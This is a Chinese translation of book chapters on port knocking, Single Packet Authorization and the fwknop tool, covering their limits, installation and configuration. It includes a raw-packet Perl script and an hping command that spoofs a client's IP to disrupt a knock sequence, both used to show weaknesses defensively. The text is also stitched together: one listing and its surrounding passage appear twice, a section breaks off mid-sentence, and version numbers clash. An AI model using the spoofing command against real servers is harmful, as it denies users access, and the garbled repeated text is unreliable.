该脚本位于 [`www.cipherdyne.org/linuxfirewalls`](http://www.cipherdyne.org/linuxfirewalls)。你需要从 CPAN 获取 `Net::RawIP` Perl 模块才能运行它（参见 [`search.cpan.org/~skolychev/net-rawip-0.2/rawip.pm`](http://search.cpan.org/~skolychev/net-rawip-0.2/rawip.pm)）。

当然，从协议的角度来看，手动定义的校验和值几乎是无效的，因此敏锐的观察者可能会在网络流量中注意到它们。某些以太网嗅探器如 `Wireshark`(参见 [`www.wireshark.org`](http://www.wireshark.org))会自动根据数据包头部和数据验证校验和，并在出现差异时警告用户。`Netfilter`自 2.6 内核系列以来也可以通过其连接跟踪系统验证校验和值。

```
 $ cat craft_udp_checksum.pl
#!/usr/bin/perl -w

use Net::RawIP;
use strict;

my $src  = $ARGV[0] || &usage();
my $dst  = $ARGV[1] || &usage();
my $port = $ARGV[2] || &usage();
my $sum  = $ARGV[3] || 0;

$sum = hex $sum;

my $raw_udp = new Net::RawIP({
    ip => {
        saddr => $src,
        daddr => $dst
    },
    udp =>{}}
);

$raw_udp->set({
    ip  => {
        saddr => $src,
        daddr => $dst
    },
    udp => {
        source => 30401,
        dest   => $port,
        check  => $sum
    },
});

printf "[+] Sending UDP packet $src -> $dst ($port) with checksum %x\n",
    $sum;
$raw_udp->send();

exit 0;

sub usage() {
    die "[*] $0 <src> <dst> <port> <checksum>";
}
```

*列表 12-1：一个 UDP 校验和构造脚本*

按照如下方式执行上述脚本并使用以太网嗅探器观察 UDP 数据包，你可以清晰地看到从命令行提供的构造校验和 `0xdeed`（**加粗**）：

```
 # ./craft_udp_checksum.pl 192.168.10.3 192.168.10.1 5005 deed
### tcpdump -i eth1 -l -nn -s 0 -X port 5005
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
02:21:46.652478 IP 192.168.10.3.30401 > 192.168.10.1.5005: UDP, length 0
     0x0000:  4510 001c 0000 4000 4011 a56c c0a8 0a03  E.....@.@..l....
     0x0010:  c0a8 0a01 76c1 138d 0008 deed 0000 0000  ....v...........
     0x0020:  0000 0000 0000 0000 0000 0000 0000 0000       ..............
```

## 加密的端口敲击序列

端口敲击序列可以使用对称密码进行加密，例如美国标准与技术研究院（NIST）为美国高级加密标准选择的 `Rijndael` 算法。这为端口敲击序列引入了强大的加密层，代价是必须进行相关的密钥管理。

将尽可能多的信息编码到加密的端口敲击序列是有是有的。`TCP` 或 `UDP` 头部中端口字段以外的字段也可以用于在端口敲击序列中编码额外信息。例如，`UDP` 头部中 16 位的校验和字段可以由端口敲击客户端手动设置为一个预定值，并可以开发一个端口敲击服务器，只有当校验和与该值匹配时才接受该 `UDP` 数据包作为序列的一部分。

当然，从协议的角度来看，手动定义的校验和值几乎是无效的，因此敏锐的观察者可能会在网络流量中注意到它们。某些以太网嗅探器如 `Wireshark`会自动根据数据包头部和数据验证校验和，并在出现差异时警告用户。`Netfilter`自 2.6 内核系列以来也可以通过其连接跟踪系统验证校验和。

```
 $ cat craft_udp_checksum.pl
#!/usr/bin/perl -w

use Net::RawIP;
use strict;

my $src  = $ARGV[0] || &usage();
my $dst  = $ARGV[1] || &usage();
my $port = $ARGV[2] || &usage();
my $sum  = $ARGV[3] || 0;

$sum = hex $sum;

my $raw_udp = new Net::RawIP({
    ip => {
        saddr => $src,
        daddr => $dst
    },
    udp =>{}}
);

$raw_udp->set({
    ip  => {
        saddr => $src,
        daddr => $dst
    },
    udp => {
        source => 30401,
        dest   => $port,
        check  => $sum
    },
});

printf "[+] Sending UDP packet $src -> $dst ($port) with checksum %x\n",
    $sum;
$raw_udp->send();

exit 0;

sub usage() {
    die "[*] $0 <src> <dst> <port> <checksum>";
}
```

*列表 12-1：一个 UDP 校验和构造脚本*

如果你按照如下方式执行上述脚本并使用以太网嗅探器观察 UDP 数据包，你可以清晰地看到从命令行提供的构造校验和 `0xdeed`（**加粗**）：

```
 # ./craft_udp_checksum.pl 192.168.10.3 192.168.10.1 5005 deed
### tcpdump -i eth1 -l -nn -s 0 -X port 5005
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
02:21:46.652478 IP 192.168.10.3.30401 > 192.168.10.1.5005: UDP, length 0
     0x0000:  4510 001c 0000 4000 4011 a56c c0a8 0a03  E.....@.@..l....
     0x0010:  c0a8 0a01 76c1 138d 0008 deed 0000 0000  ....v...........
     0x0020:  0000 0000 0000 0000 0000 0000 0000 ..............
```

## 加密的端口敲击序列

端口敲击序列可以使用对称密码进行加密，例如美国标准与技术研究院（NIST）为美国高级加密标准选择的 `Rijndael` 算法。这为端口敲击序列引入了强大的加密层，代价是必须进行相关的密钥管理。

将尽可能多的信息编码到加密的端口敲击序列是有益的...



尽管端口敲门（port knocking）可以为可能包含未发现漏洞的网络服务提供额外的保护，但端口敲门架构的某些特性使其显得相当脆弱，且无法扩展到企业级部署。这些局限性源于使用数据包头作为数据传输机制，而不是使用应用层负载。正如我们很快将看到的，SPA（在第 226 页的“单包授权”中讨论）解决了传统端口敲门实现中的许多局限性。

## 序列重放问题

在当今安全威胁横行的世界里，我们应该假设所有流量在跨网络传输时都会被未知的第三方监控。坚决地坚持这一观点，提供了充足的动力，来确保敏感信息（如信用卡号）仅以加密形式在网络上传输。

在端口敲门的情况下，没有数据包与数据包关联的应用层数据，因此似乎没有理由去拦截端口敲门序列。

然而，端口敲门的目标是在网络上传输足够的信息，让接收者推断出应该临时重新配置包过滤器，从而授予通过敲门序列证明了其身份的 IP 地址访问权限。如果攻击者能够在端口敲门序列通过网络传输时将其拦截，那么攻击者很容易在稍后的时间向同一目标发送完全相同的敲门序列。这被称为`重放攻击`（replay attack），因为攻击者正在对目标重放敲门序列，试图图获得与合法的端口敲门客户端相同的访问权限。由于端口敲门仅使用数据包头，很难在敲门序列中构建足够的变体来阻止重放攻击。

某些端口敲门实现使用哈希函数的连续迭代（类似于 RFC 1760 中定义的 S/Key 身份验证）来阻止重放攻击，但这些方法要求客户端和服务器都存储某些状态信息。或者，我们可以在授予访问权限后，简单地更改共享的端口敲门序列或每个加密序列的解密密码，但这非常繁琐，对于大量用户来说显然不具备扩展性。（我们将在第 226 页的“单包授权”中看到，有一种更优雅的方法来击败重放攻击。）

## 最小数据传输率

由于 TCP 和 UDP 头部中的端口字段宽度为 16 位，如果我们假设端口敲门实现仅使用敲门序列中每个数据包的目标端口号，则每个包只能传输两个字节的信息。此外，由于端口敲门没有像 TCP 那样的保证顺序交付和数据包重传机制（端口敲门是严格单向的），我们无法在不在每个连续数据包之间添加时间延迟的情况下，向网络发送完整的端口敲门序列。我们需要时间延迟来保持敲门序列的正确顺序，因为数据包可能通过不同的路径到达——其中某些路径可能比其他路径慢。

虽然没有适用于所有网络的最优延迟（事实上，如果丢失了敲门序列中的某个成员，整个序列必须重新传输），但半秒的延迟是一个很好的起点。

因此，对于一个使用具有 128 位块大小的对称加密器加密的端口敲门序列（本章前面提到过的 Rijndael 算法的最小块大小），我们得到的最小长度为八个数据包（128 位 ÷ 每个包 16 位 = 8 个数据包）。在每个数据包之间添加半秒延迟意味着，仅传输该序列就需要四秒钟，如果需要发送更多数据，则每两个数据包就会增加一整秒。正是这种漫长的传输时间使得构建发送超过几个字节的端口敲门序列变得不实际。

### 注意

由于端口敲门的数据传输能力非常有限，使用非对称加密算法来加密端口敲门序列是不可能的。即使仅使用 GnuPG 和带有 2048 位密钥的 Elgamal 算法加密 10 字节的信息，也会导致数百字节的加密信息。

## 敲击序列与端口扫描

正如第 3 章 中讨论的，端口扫描涉及在短时间内对目标系统上的多个端口进行的一系列连接。在链路上进行检查时，端口敲门序列显然符合这一定义，尽管端口扫描与敲门序列的目标完全不同。问题在于，任何监控端口扫描的入侵检测系统（IDS）都无法区分这两种活动，并会对这两种产生警报。这些警报可能会给使用端口敲门对远程服务进行身份验证的人带来不受欢迎的关注。

### 注意

我认识某个人（我们称他为 Bob），因为公司安全策略禁止端口扫描，他被要求辞去他的职位。为了增强安全性，Bob 反复扫描了他的家庭系统以确保服务无法被访问，但本地 IDS 捕到了该活动。如果 Bob 使用的是端口敲门系统，IDS 警报就会响起。当然，这是一个极端例子，但它强调了这一点：没有理由给自己引起不必要的关注。

## 使用伪造数据包瓦解敲击序列

由于端口敲门仅将信息编码在数据包头内（而不是依赖加密的应用层数据），因此攻击者很容易伪造数据包，使其看起来像合法敲门序列的一部分。如果攻击者在端口敲门序列通过网络传输过程中伪造一个重复数据包，敲门服务器无法判断该额外数据包不是来自敲门客户端的真实序列；结果是客户端似乎不知道有效的敲门序列。这是针对敲门服务器的拒绝服务（DoS）攻击，因为攻击者可以强制服务器不向合法的敲门客户端提供访问。DoS 攻击可以是复杂的（例如从僵尸网络向单个 IP 地址泛洪流量），但也可以极其简单；使用单个数据包对端口敲门服务器进行 DoS 攻击极其容易——可以在任何地方进行伪造！

为了说明这种攻击，假设端口敲门客户端和服务器约定了以下敲击序列，以开启 TCP 22 端口 30 秒（所有包均为 TCP SYN 包）：1001, 2004, 5005, 1001, 1000。现在，假设 IP 地址 `123.4.3.2` 开始向运行在 IP 地址 `231.1.2.3` 的敲门服务器发送序列，每个数据包之间有半秒延迟。如果攻击者可以在序列通过网络传输时监控它，那么以下 `hping` 命令的使用将看起来敲门客户端实际上发送了“1001, 2004, 5005, 5005, 1001, 1000”序列（注意端口 5005 的重复包）：

```
[root@attacker ~]# hping -S -p 5005 -c 1 -a 123.4.3.2 231.1.2.3
HPING 231.1.2.3 (eth0 231.1.2.3): S set, 40 headers + 0 data bytes

--- 231.1.2.3 hping statistic ---
1 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
```



因此，端口敲门服务器只能将敲门序列视为无效并丢弃，因为它看起来源自真实客户端的 IP 地址。因此，不会授予 SSH 访问，这在图 12-2 中所示。

![攻击者向端口敲门序列注入伪造的数据包，导致 DoS](img/httpatomoreillycomsourcenostarchimages207404.png)

图 12-2. 攻击者向端口敲门序列注入伪造的数据包，导致 DoS

* * *

^([71]) 3 Martin Krzywinski, "Port Knocking: Network Authentication Across Closed Ports," *SysAdmin* 12 (2003): 12–17.

^([72]) 4 “一组加密端口”意味着端口序列定义了一系列字节值，而该序列本身被用作加密算法的输入。其结果是一组新的字节值，对应于新的端口号。这在章节的稍后部分将变得更加清晰。

^([73]) 5 如果端口敲门服务器或其依赖的任何库（如 `libpcap`）存在漏洞，那么攻击者仍然可能攻破部署了端口敲门方案的系统。然而，寻找这样的系统并不像使用 `Nmap` 扫描那些乐于暴露自身存在的漏洞服务那么简单。

## 单包授权 (Single Packet Authorization)

端口敲门向我们展示了如何最大化利用包过滤器，对所有通信受保护服务的尝试执行默认丢弃（default-drop）策略.^([74]) 然而，如本章前面所示，端口敲门并非万能药，它具有显著的架构局限性。在本节中，我们将探索一种端口敲门的替代方案，它在保留其优势的同时避免其缺点。

`Single Packet Authorization (SPA)` 以类似于端口敲门实现的方式将默认丢弃包过滤器与被动监控的数据包嗅探器相结合。然而，SPA 并不是在包头字段内传输认证数据，而是利用有效负载（payload）数据来证明拥有身份凭据。这之所以有效是因为大多数网络的 MTU 大在几百字节左右（例如，以太网 MTU 为 1514 字节，包括以太网头部），因此只需要单个包即可向 SPA 服务器传达身份。

由于端口敲门和 SPA 共享默认丢弃包过滤器和被动监控设备的概念，图 12-3 中的图与图 12-1 非常相似，后者说明了端口敲门。但这次只需要一个包向 SPA 服务器传输认证信息，因此从（伪造的）SPA 源地址到 `iptables` 系统只有一条线；在真实的 SSH 会话开始之前不需要数据包序列。我们很快就会看到这是端口敲门方案之外的重要创新。

![SPA 网络](img/httpatomoreillycomsourcenostarchimages207436.png)

图 12-3. SPA 网络

## 端口敲门的局限性

端口敲门协议带来的问题简要总结如下：

*   很难阻止能够监控端口敲门序列的攻击者进行重放攻击。
*   缺乏有效的数据传输限制了可能用于加密序列数据的类型类型，甚至是加密系统。
*   当在网络上发送端口敲门序列时，任何中间 IDS 可能会触发警报。
*   执行序列破坏攻击（sequence-busting attacks）轻而容易，因为包头并不难复制和伪造。

通过使用 SPA 中的负载数据，我们可以克服这些每一个缺陷：

*   SPA 通过在每个 SPA 包中包含随机数据解决了重放问题。每个 SPA 包都是根据定义良好的明文包格式构建的（由 `fwknop` 使用的特定格式将在第 13 章 中进行讨论）。该格式为随机数据留出了空间，一旦包构建完成，就会被加密。包含随机数据确保了没有两个 SPA 包是相同的——即使它们向 SPA 服务器发起了相同的访问请求。通过在服务器端存储每个成功解密的 SPA 包的 `MD5` 和，我们可以重复发送相同的访问请求，而深知没有两个 SPA 包会具有相同的 `MD5` 和。因此，通过比较任何新 SPA 包与之前监控的数据包的 `MD5` 和，可以轻松地挫败重放攻击。
*   SPA 通过使用 IP 包的负载部分解决了数据传输问题，类似于 `TCP` 封装应用层数据的方式。使用包负载有利于使用非对称密码进行加密，因为包负载可以传输的数据量比任何端口敲门实现（后者仅使用头部）都要多得多。我们甚至可以在 SPA 之上构建一个命令通道（即在加密的 SPA 负载中进行完整命令通信）。我们将在第 13 章 中看到，`fwknop` 同时支持访问请求和完整的命令通道实现。
*   SPA 确保了其网络通信看起来并不像端口扫描，因为它只使用单个包来传输认证信息。这样一来，IDS 不会看到针对一系列端口的一系列探测。由于 SPA 负载是加密的，IDS 也无法解码 SPA 消息的内容；任何嗅探者都会看到 SPA 包只是一个段无法理解的负载数据块。
*   使用 SPA 挫败了伪造攻击，因为攻击者无法仅仅通过从 SPA 客户端系统向服务器伪造包来轻易破解 SPA 协议。（当然，任何在网络上检查包数据的系统如果被垃圾包数据淹没都会受到 DoS 攻击，但这并不是 SPA 协议本身的缺陷。）

## SPA 的架构局限性

尽管 SPA 在减少服务对潜在攻击者的暴露方面提供了安全优势，但它也有局限性。我们将探索这些，以便你对如何最佳部署  明智决定。端口敲门也存在这些局限性。

### 通过 NAT 地址进行访问附加

包过滤器通常擅长过滤传输层及以下的流量，但不擅长解释应用层。因此，SPA 守护进程在接收有效 SPA 包后接受入站连接时应用的过滤标准，现实中只能包含源 IP 地址、请求的 Internet 协议和端口号。也就是说，当一个 SPA 包指示 SPA 服务器“为某些源 IP 地址打开 30 秒 TCP 22 端口”时，SPA 服务器配置包过滤器，接受在 30 秒时间窗口内从源 IP 地址连接到端口 22 的任何数据包。如果 SPA 包内的 IP 地址是外部 NAT 地址（如果 SPA 客户端位于 NAT 设备之后，则这是必要的），那么与合法客户端在同一内部网络上的任何人在允许的时间内都将拥有访问权限.^([75])

### HTTP 和短寿命会话





当 SPA 守护进程在数据包过滤器规则集中添加一条临时规则以允许建立 TCP 连接时，合法客户端通常有足够的时间完成 TCP 三次握手。然而，SSH 会话的持续时间通常比将一个 TCP 连接推入建立状态所需的时间长得多。

当规则从规则集中删除时会发生什么？通过使用连接跟踪机制（例如由 `Netfilter` 提供的），在被默认丢弃（default-drop）规则拦截之前接受已建立连接的数据包，即使允许建立会话的初始规则已被删除，连接仍然保持开启状态。

使用连接跟踪机制保持已建立的 TCP 连接开放为长时间 TCP 会话提供了一个优雅的解决方案，但对于短连接（例如通过 Web 传输 HTTP 数据，或在邮件服务器之间传输 SMTP 数据）又是怎样的？为用户想要查看的每个网页链接都生成一个新的 SPA 数据包将是不方便的；由于每个链接都通过独立的 TCP 连接传输，这一事实使得问题变得更加复杂。通常情况下，`SPA` 并不适用于保护此类服务。

解决此问题的方法之一是扩展客户端 IP 地址的超时时间，使其在例如一小时内不需要新的 SPA 数据包。虽然这种扩展在一定程度上降低了 `SPA` 的效率，但如果你的 Web 服务器运行着关键应用程序且安全是最重要的考虑因素，那么这样做是有意义的。也可以通过在本地文件系统中缓存加密密码，让 SPA 客户端自动生成 SPA 数据包。然而，通常情况下，将加密密码（这可能会削弱 `GnuPG` 密钥的安全性）放在文件系统中并不是好主意。尽管如此，一个有效的步骤是将 `SPA` 客户端尽可能与许多客户端程序深度集成。关于 `OpenSSH` 的这一示例，请参见第 252 页上的“fwknop OpenSSH Integration Patch”。

***

⁶ 这完全符合解决“默认许可”（default permit）的尝试，这在 Marcus Ranum 的《计算机安全六个最愚蠢的想法》中位列首位（参见 [`www.ranum.com`](http://www.ranum.com)）。*默认许可*是默认丢弃（default drop）的对面，它是互联网的基础原则之一：对信息的不受限制访问和共享。这一原则在计算机安全漏洞和入侵并不寻常的时代运行得很好，但那些日子已经一去不复了。

⁷ NAT 地址背后的搭便（piggy-backing）问题可以通过 Tor 网络提供的 `MapAddress` 功能来缓解，但该功能引入了其他缺点，正如我们在第 254 页的“SPA over Tor”中讨论的。

⁸ 在某些情况下可以保持 Web 连接开启；参见 Apache 中的 `KeepAlive` 指令（参见 [`httpd.apache.org/docs/1.3/mod/core.html#keepalive`](http://httpd.apache.org/docs/1.3/mod/core.html#keepalive)）。

# 隐蔽实现安全？

端口触发（port knocking）或 `SPA` 是否属于隐蔽实现安全的范畴？自从端口触发首次向安全社区公布以来，这一直是一个激烈争议的话题，双方都有强烈的观点。无疑，争议在这里不会得到解决；我的希望是提供一些思考的。

当一种新的安全技术被提出时，全球的研究人员都会对其架构进行审查。安全技术的常见测试之一是它是否遭受“隐蔽实现安全”的影响；如果是，人们会尝试修复架构。因此，确定 `SPA` 是否遭受隐蔽实现安全的影响是非常重要的。Bruce Schneier 在《应用密码学》（*Applied Cryptography*）的序言中写：

> . . . 如果我拿一封信，把它锁在保险箱里，把保险箱藏在纽约某处，然后让你读信，那不是安全。那是隐蔽。另一方面，如果我拿一封信并锁在保险箱里，然后把保险箱连同设计规范以及数百个带有密码的相同保险箱交给你，让你和世界上最好的开锁专家可以研究锁定机制——而你仍然无法打开保险箱并读信——那就是安全。 . . .

任何端口触发或 `SPA` 的开源实现都类比于提供了保险箱内部构造的所有细节。从加密算法到每部分软件如何与数据包过滤器接口，一切都是对所有人可见的。只有当加密的 `SPA` 数据包或端口触发序列穿越网络时，隐藏的仅仅是加密密钥本身，而强大的加密系统不会因为加密密钥没有向世界公布就遭受隐蔽实现安全的影响。

现在，考虑一个比端口触发或 `SPA` 更弱的安全系统。假设在 `OpenSSH` 服务器守护进程的某个函数中发现了漏洞，我创建了一个假设的 `OpenSSH` 补丁，要求所有远程 SSH 客户端访问该函数的尝试都必须提供一些加密数据。这些数据将使用已知且经过审查的加密算法，如 `Rijndael` 或 `GnuPG` 使用的 `Elgamal` 算法。

有人可能会认为（我也这么认为），在这个假设的示例中，利用该漏洞进行攻击的可能性被降低到了只要加密算法是安全的程度，因此，这种修复并不依赖于隐蔽实现安全。

端口触发（至少在其加密形式中）和 `SPA` 提供了比这个人为示例更好的安全属性，因为恶意客户端在没有提供类似的加密数据之前，甚至无法与 SSH 服务器上的 TCP 栈建立 TCP 会话，更不用与 SSH 守护进程了。因此，在端口触发和 `SPA` 中，我们本质上有一种泛化机制，使得在没有提供这段加密数据之前，`OpenSSH` 守护进程中的*所有*函数都是不可访问的。因此，端口触发和 `SPA` 都不应被仅仅视为隐蔽实现安全的技术。

***

⁹ 这些想法中的许多是由 Sebastien Jeanquier 在伦敦大学皇家霍洛伊学院信息安全小组的硕士论文《端口触发与单数据包授权分析》中提出的（参见 [`www.isg.rhul.ac.uk`](http://www.isg.rhul.ac.uk)）。

# 结语





有些人偏好于编写脚本，通过监控 `/var/log/auth.log`（具体文件取决于你的 syslog 守护进程配置）中报告的重复 `Authentication failure for root` 消息来检测攻击者何时尝试通过 SSHD 暴力破解密码。然而，如果在 `OpenSSH`（或另一个 SSH 实现）的某个无需通过用户名/密码验证即可远程访问的函数中发现了新的缓冲区溢出漏洞，这种方法将几乎毫无用。甚至有 Snort 规则可以在 SSH 连接上执行明文 IDS，以检测针对 Buqtraq 2347 号报告的 `CRC32` 溢出漏洞的利用尝试（参见 Snort 规则 ID 1324、1326 和 1327）。拥有了这种利用程序，攻击者无需尝试暴力破解密码，甚至不需要进入 SSH 通常要求的加密/解密协议。更好的策略是从根本上不让任意 IP 地址连接到你的 SSH 守护进程。这就是 `SPA` 发挥用场的地方，在第 13 章 中，我将向你展示如何部署 `fwknop`，通过在 SSH 守护进程之上叠加 `SPA` 和 `iptables` 来获得最大收益。在这样的配置下，针对 SSHD 的零日漏洞利用和暴力破解密码尝试都是徒劳的。

# 第 13 章 介绍 FWKNOP

FireWall KNock OPerator (`fwknop`，参见 [`www.cipherdyne.org/fwknop`](http://www.cipherdyne.org/fwknop)）于 2004 年 6 月以 GNU 公用许可证 (GPL) 作为开源项目发布。它是第一个将加密端口敲与被动操作系统指纹识别相结合的端口敲实现，使得仅允许 Linux 系统连接到你的 SSH 守护进程成为可能。（端口敲客户端系统的 TCP 栈充当了额外的身份验证参数）。`fwknop` 的端口敲组件基于 `iptables` 日志消息，并使用 `iptables` 作为默认丢弃的数据包过滤器。

2005 年 5 月，我为 `fwknop` 发布了单包授权（SPA）模式，因此 `fwknop` 成为第一个公开的 SPA 软件。截至本文写作，`fwknop-1.0` 是最新可用版本，`SPA` 身份验证方法是默认方法，尽管 `fwknop` 继续支持旧的端口敲方法。MadHat 在 2005 年 7 月的 Black Hat 会议上提出了“Single Packet Authorization”（单包授权）这一术语。我向同一场会议提交了类似的提案进行演示，但 `Single Packet Authorization` 比起我的标题——`Netfilter and Encrypted, Non-replayable, Spoofable, Single Packet Remote Administration`——读起来要顺口得多。值得注意的是，由 tumbler 项目 ([`tumbler.sourceforge.net`](http://tumbler.sourceforge.net)) 实现的一种协议与 `SPA` 相似之处在于，它只使用单个数据包传输身份验证和授权信息；然而，它的负载是哈希过的而非加密，这导致了完全不同的架构。

### 注意事项

`fwknop` 确实支持身份验证（authentication——验证正在通信内容的实体的数字身份的过程）和授权（authorization——尝试确定实体是否有权限执行某项操作的过程），对于想要访问默认丢弃数据包过滤器后服务的远程客户端。这两个过程是不相同的，并且在各自的领域都是重要的。

## fwknop 安装

安装 `fwknop` 起于从 [`www.cipherdyne.org/fwknop/download`](http://www.cipherdyne.org/fwknop/download) 下载最新的源码 tar 包或 RPM。按照惯例，验证 MD5 校验和是明智的；从安全角度来看，使用 `GnuPG` 检查 `GnuPG` 签名是否通过更好。[78] 一旦确定下载的文件是安全的，就可以继续安装。以下是安装 `fwknop` 1.0 版本的源码 tar 包的方法：

```
$ cd /usr/local/src
$ wget http://www.cipherdyne.org/fwknop/download/fwknop-1.8.1.tar.bz2
$ wget http://www.cipherdyne.org/fwknop/download/fwknop-1.8.1.tar.bz2.md5
$ md5sum -c fwknop-1.8.1.tar.bz2.md5
$ fwknop-1.8.1.tar.bz2: OK
$ wget http://www.cipherdyne.org/fwknop/download/fwknop-1.8.1.tar.bz2.asc
$ gpg --verify fwknop-1.8.1.tar.bz2.asc
gpg: Signature made Wed Jun 6 01:27:16 2007 EDT using DSA key ID A742839F
gpg: Good signature from "Michael Rash <mbr@cipherdyne.org>"
gpg:                 aka "Michael Rash <mbr@cipherdyne.com>"
$ tar xfj fwknop-1.8.1.tar.bz2
$ su -
Password:
# cd /usr/local/src/fwknop-1.8.1
# ./install.pl
```

正如在第 5 章 中安装 `psad` 一样，`install.pl` 脚本将提示你提供一些信息，例如授权模式（即你是想使用 `SPA` 模式还是旧的端口敲模式）以及你希望 `fwknop` 嗅探数据包的接口。

你可以在仅支持作为 `SPA` 客户端发送 `SPA` 包的系统上安装 `fwknop$，也可以可以在完全支持发送 `SPA` 包以及从网络中嗅探数据包的系统上安装（这是默认设置）。完整安装 fwknop 会在系统中创建几个文件和目录以支持正常操作，如下：

**/usr/bin/fwknop**

这是负责接受用户输入的密码的客户端程序；构建符合 `fwknop` 数据包格式的 `SPA` 包；使用 `Rijndael` 对称加密加密包数据，或通过与 `GnuPG` 接口进行非对称加密；以及通过 `UDP`、`TCP` 或 `ICMP` 发送加密的 `SPA` 包。默认情况下，`fwknop` 通过 `UDP` 端口 `62201` 发送 `SPA` 包，可以通过命令行进行更改。

**/usr/sbin/fwknopd**

这是主守护进程，负责嗅探和解密 `SPA` 包数据、防止重放攻击、解码 `fwknop` `SPA` 包格式、验证访问权限，并重新配置本地 `iptables` 策略，以为 `SPA` 包请求的服务授予临时访问权限。

**/usr/bin/fwknop_serv**

这是一个简单的 `TCP` 服务器，仅当 `SPA` 包通过 Tor 匿名网络 ([`tor.eff.org`](http://tor.eff.org)) 发送时才使用。使用此服务器会导致双向通信，因此在技术上破坏了 `SPA` 协议通常的单向性；更多信息请参见第 254 页的“SPA over Tor”。

**/usr/lib/fwknop**

`fwknop` 使用的 Perl 模块安装在此目录下，以保持系统 Perl 库的整洁。安装的模块包括 `Net::Pcap`、`Net::IPv4Addr`、`Net::RawIP`、`IPTables::Parse`、`IPTables::ChainMgr`、`Unix::Syslog`、`GnuPG::Interface`、`Crypt::CBC` 和 `Crypt::Rijndael`。`install.pl` 脚本非常小心，只安装系统 Perl 库中不存在的 模块，以最小化磁盘占用。然而，你可以通过 `--force-mod-install` 命令行参数强制 `install.pl` 安装所有 Perl 模块。在运行 `ipfw` 防火墙的系统或 Cygwin 下的 Windows `fwknop` 仅客户端安装上，永远 own `IPTables::Parse` 和 `IPTables::ChainMgr` 模块。

**/etc/fwknop**

这是 `fwknop` 守护进程配置文件（如 `fwknop.conf` 和 `access.conf`）的主目录。`fwknop` 守护进程在服务器模式运行时会使用此目录，而在客户端模式下生成 `SPA` 包不需要它。

**/usr/sbin/knopmd**

这是一个用于从 `/var/lib/fwknop/fwknopfifo` 命名管道解析 `iptables` 日志消息的守护进程。该守护进程仅在 `fwknop` 以旧的端口敲模式运行时才会被使用。

**/usr/sbin/knoptm**





这是一个守护进程，用于从 `iptables` 链中移除 `fwknop` 为合法 SPA 客户端添加的访问规则条目。该守护进程是必须的，因为主 `fwknopd` 守护进程是从活动接口嗅探的，操作系统只有在接口接收到数据包时才会对其调度运行。如果 `fwknopd` 是从单独嗅探器进程或 `ulogd` 更新的 PCAP 文件读取数据包数据，则不使用 `knoptm` 守护进程。在这种情况下，`fwknopd` 会被定期调度运行，无论接口上是否接收到数据包；因此，`fwknopd` 可以独立对 `iptables` 规则执行超时策略。

`/usr/sbin/knopwatchd`

这是一个监控守护进程，当守护进程崩溃时重启它。然而，`fwknop` 通常非常稳定，因此 `knopwatchd` 通常没有太多工作要做；它的存在仅仅作为一种预防措施，因为运行 SPA 意味着除非 `fwknopd` 运行，否则没有任何可以访问受保护的服务。

`/etc/init.d/fwknop`

这是 `fwknop` 的初始化脚本。它允许用户以大多数 Linux 发行版一致的方式启动 `fwknop`——通过执行 `/etc/init.d/fwknop start`。使用 init 脚本仅在服务器模式启动 `fwknop` 的情况下才有意义。

¹ 正如第 5 章所述，我的 GnuPG 密钥可以通过 http://www.cipherdyne.org/public_key 获取。有必要使用 `gpg --import` 导入此密钥，以验证 [http://www.cipherdyne.org] 上每个软件分发文件的 GnuPG 签名。

# fwknop 配置

在服务器模式下，fwknop 引用两个主要的配置文件 `fwknop.conf` 和 `access.conf` 来获取配置指令。与 psad 配置文件（参见第 5 章）一样，这些文件中的每行都遵循简单的键值对约定来定义配置变量。按照惯例，注释行以井号 (`#`) 开头。我将在后续章节中介绍这些文件中一些较重要的配置变量。

## /etc/fwknop/fwknop.conf

`fwknop.conf` 文件定义了关键配置变量，例如身份验证模式、防火墙类型、用于嗅探数据包的接口、是否应混杂模式嗅探数据包（即 fwknop 是否处理目标不是本地接口 MAC 地址的以太网帧），以及发送警报的电子邮件地址。

### AUTH_MODE

`AUTH_MODE` 变量告诉 fwknop 守护进程如何收集数据包数据。支持多种收集模式，包括通过 `Net::Pcap` Perl 模块从活动接口嗅探数据包、从由 `ulogd`（见 http://www.netfilter.org）写入的文件系统中的文件中读取 PCAP 格式数据包、使用如 `tcpdump` 等单独的太网嗅探器，或从 `/var/log/fwknop/fwdata` 文件解析 iptables 日志消息。`AUTH_MODE` 变量的可能值为 `PCAP`、`FILE_PCAP`、`ULOG_PCAP` 和 `KNOCK`；默认值为 `PCAP`。

```
 AUTH_MODE                   PCAP;
```

### PCAP_INTF

`PCAP_INTF` 变量定义了 fwknop 守护进程用于监控数据包的活动接口。这仅在 `AUTH_MODE` 设置为 `PCAP` 时使用；默认设置为 `eth0` 接口。

```
 PCAP_INTF                   eth0;
```

### PCAP_FILTER

活动接口可能会传输或接收大量与 SPA 流量完全无关的数据包数据，没有必要强制 fwknop 守护进程处理它们。`PCAP_FILTER` 变量允许你根据网络层地址或传输层端口号等标准限制 libpcap 传递给 fwknop 的包类型。由于默认情况下 fwknop 通过 UDP 端口 62201 传输 SPA 数据包，此变量设置如下（可以修改此项通过不同的端口和或协议获取 SPA 数据包）。

```
 PCAP_FILTER                 udp port 62201;
```

### ENABLE_PCAP_PROMISC

当设置为 `Y` 时，此变量指示 fwknop 守护进程监控所有通过活动数据包捕获接口发送的以太网帧（即接口处于混杂模式）。当 `AUTH_MODE` 设置为 `PCAP` 时，默认启用此项；但如果 fwknop 守护进程嗅探的接口处于激活并分配了 IP 地址——这意味着 SPA 数据包可以直接发送到此接口——可以通过以下方式禁用此功能：

```
 ENABLE_PCAP_PROMISC         N;
```

### FIREWALL_TYPE

`FIREWALL_TYPE` 变量告诉 fwknopd 在接收到有效 SPA 数据包后其负责重新配置的防火墙类型。支持的值有 `iptables`（默认）以及用于 FreeBSD 和 Mac OS X 系统的 `ipfw`。

```
 FIREWALL_TYPE               iptables;
```

### PCAP_PKT_FILE

如果 `AUTH_MODE` 设置为 `FILE_PCAP` 或 `ULOG_PCAP`，则 fwknop 守护进程从文件系统内的 PCAP 格式文件获取数据包数据。该文件的路径由 `PCAP_PKT_FILE` 变量定义，并设置为以下默认值：

```
 PCAP_PKT_FILE               /var/log/sniff.pcap;
```

### IPT_AUTO_CHAIN1

